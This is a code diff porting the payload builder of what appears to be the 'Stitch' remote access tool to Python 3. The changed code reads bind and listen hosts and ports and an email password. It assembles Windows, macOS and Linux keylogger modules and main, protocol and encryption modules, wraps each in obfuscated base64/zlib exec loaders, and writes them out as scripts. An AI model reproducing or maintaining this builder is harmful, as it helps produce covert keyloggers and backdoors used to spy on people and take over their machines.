@@ -1,9 +1,9 @@
-from stitch_utils import *
-from stitch_pyld_config import *
+from .stitch_utils import *
+from .stitch_pyld_config import *
 
-from Stitch_Vars.nsis import *
-from Stitch_Vars.payload_code import *
-from Stitch_Vars.payload_setup import *
+from .Stitch_Vars.nsis import *
+from .Stitch_Vars.payload_code import *
+from .Stitch_Vars.payload_setup import *
 
 if windows_client():
     import py2exe
@@ -14,12 +14,12 @@ def assemble_stitch():
 
     stini = stitch_ini()
     BIND = stini.get_bool("BIND")
-    BHOST = stini.get_value("BHOST")
-    BPORT = stini.get_value("BPORT")
+    BHOST = stini.get_value("BHOST").encode()
+    BPORT = stini.get_value("BPORT").encode()
 
     LISTEN = stini.get_bool("LISTEN")
-    LHOST = stini.get_value("LHOST")
-    LPORT = stini.get_value("LPORT")
+    LHOST = stini.get_value("LHOST").encode()
+    LPORT = stini.get_value("LPORT").encode()
 
     EMAIL = stini.get_value("EMAIL")
     EMAIL_PWD = base64.b64decode(stini.get_value("EMAIL_PWD"))
@@ -69,13 +69,13 @@ def assemble_stitch():
     st_osx_kl     = get_osx_keylogger()
     st_lnx_kl     = get_lnx_keylogger()
 
-    st_main       = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_main)))
-    st_utils      = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_utils)))
-    st_protocol   = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_protocol)))
-    st_encryption = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_encryption)))
-    st_win_kl     = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_win_kl)))
-    st_osx_kl     = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_osx_kl)))
-    st_lnx_kl     = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_lnx_kl)))
+    st_main       = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_main.encode())))
+    st_utils      = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_utils.encode())))
+    st_protocol   = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_protocol.encode())))
+    st_encryption = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_encryption.encode())))
+    st_win_kl     = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_win_kl.encode())))
+    st_osx_kl     = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_osx_kl.encode())))
+    st_lnx_kl     = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_lnx_kl.encode())))
 
     main_script   = os.path.join(configuration_path,'st_main.py')
     utils_script  = os.path.join(configuration_path,'st_utils.py')
@@ -86,21 +86,21 @@ def assemble_stitch():
     osx_keylg_script  = os.path.join(configuration_path,'st_osx_keylogger.py')
     lnx_keylg_script  = os.path.join(configuration_path,'st_lnx_keylogger.py')
 
-    with open(main_script,'wb') as m:
+    with open(main_script,'w') as m:
         m.write(st_main)
-    with open(utils_script,'wb') as u:
+    with open(utils_script,'w') as u:
         u.write(st_utils)
-    with open(proto_script,'wb') as m:
+    with open(proto_script,'w') as m:
         m.write(st_protocol)
-    with open(encry_script,'wb') as m:
+    with open(encry_script,'w') as m:
         m.write(st_encryption)
-    with open(reqmnt_script,'wb') as u:
+    with open(reqmnt_script,'w') as u:
         u.write(required_imports)
-    with open(win_keylg_script,'wb') as u:
+    with open(win_keylg_script,'w') as u:
         u.write(st_win_kl)
-    with open(osx_keylg_script,'wb') as u:
+    with open(osx_keylg_script,'w') as u:
         u.write(st_osx_kl)
-    with open(lnx_keylg_script,'wb') as u:
+    with open(lnx_keylg_script,'w') as u:
         u.write(st_lnx_kl)
 
     st_print("[+] Stitch Modules are now complete.")
